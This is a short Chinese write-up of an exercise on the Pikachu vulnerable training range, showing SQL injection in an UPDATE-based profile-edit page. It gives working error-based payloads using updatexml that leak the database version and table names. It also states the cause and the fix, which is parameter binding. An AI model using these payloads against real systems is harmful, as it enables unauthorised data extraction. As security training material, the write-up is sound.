# Pikachu | SQL注入 update注入
## 一、漏洞简介
修改用户信息的update语句存在注入，适合报错注入。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_update.php
## 三、复现步骤
1. 修改个人信息，昵称处输入payload：
`' and updatexml(1,concat(0x7e,version(),0x7e),1) -- `
2. 提交，页面爆出数据
## 四、Payload
`' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- `
## 五、漏洞原理
update set语句拼接输入。
## 六、修复方案
预编译参数绑定。
## 七、总结
update、insert、delete都属于增删改注入，大多用报错注入。